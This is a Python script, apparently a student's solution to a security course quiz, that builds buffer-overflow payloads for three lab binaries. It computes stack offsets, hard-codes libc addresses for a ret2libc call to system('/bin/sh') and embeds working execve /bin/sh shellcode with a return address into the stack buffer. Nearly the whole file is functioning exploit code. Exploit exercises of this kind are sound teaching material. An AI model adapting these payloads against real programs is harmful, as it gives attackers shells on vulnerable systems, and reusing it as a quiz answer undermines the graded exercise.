import struct, os

# ── CONFIGURE ────────────────────────────────────────────────────────────────
BASE = "/mnt/c/Users/andre/Desktop/326_quiz3/nektarios/nektarios"

# Binary classification (bin.0 is PIE warmup — skip):
# bin.1: GNU_STACK RW  (NX on)  → ret2libc   lea -0x2a(%ebp) → offset 46
# bin.2: GNU_STACK RWE          → shellcode   lea -0x2c(%ebp) → offset 48
# bin.3: GNU_STACK RWE          → shellcode   lea -0x28(%ebp) → offset 44

# Offsets: lea_hex + 4 (saved EBP)
OFFSET_1 = 0x2a + 4   # = 46
OFFSET_2 = 0x2c + 4   # = 48
OFFSET_3 = 0x28 + 4   # = 44

# Libc addresses — from lab machine (TEMP=1000, ASLR off, Rocky Linux i686):
SYSTEM  = 0xb7dffd30
BINSH   = 0xb7f40caa
FAKERET = 0xdeadbeef

# buf_addr — from GDB batch on lab machine (break *0x804933c, p/x $ebp - 0x2c / 0x28):
# NOTE: nektarios binaries are identical to lefteris (same BuildIDs), so addresses match.
BUF_ADDR_2 = 0xbfffdbdc   # bin.2: ebp - 0x2c
BUF_ADDR_3 = 0xbfffdbe0   # bin.3: ebp - 0x28

SHELLCODE = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80'
# ─────────────────────────────────────────────────────────────────────────────

def p32(v): return struct.pack('<I', v)

def write_exploit(path, payload):
    with open(path, 'wb') as f:
        f.write(str(len(payload)).encode() + b' ' + payload)
    print(f"[+] wrote {path}  ({len(payload)} bytes)")

# bin.1 — ret2libc
r2l_1 = b'A' * OFFSET_1 + p32(SYSTEM) + p32(FAKERET) + p32(BINSH)
write_exploit(f"{BASE}/exploit.1", r2l_1)

# bin.2 — shellcode (RWE, OFFSET=48)
sc2 = SHELLCODE + b'A' * (OFFSET_2 - len(SHELLCODE)) + p32(BUF_ADDR_2)
write_exploit(f"{BASE}/exploit.2", sc2)

# bin.3 — shellcode (RWE, OFFSET=44)
sc3 = SHELLCODE + b'A' * (OFFSET_3 - len(SHELLCODE)) + p32(BUF_ADDR_3)
write_exploit(f"{BASE}/exploit.3", sc3)

print("\n[*] All exploit files generated.")
print(f"[*] Verify with: wsl bash /mnt/c/Users/andre/AppData/Local/Temp/verify_nektarios.sh")
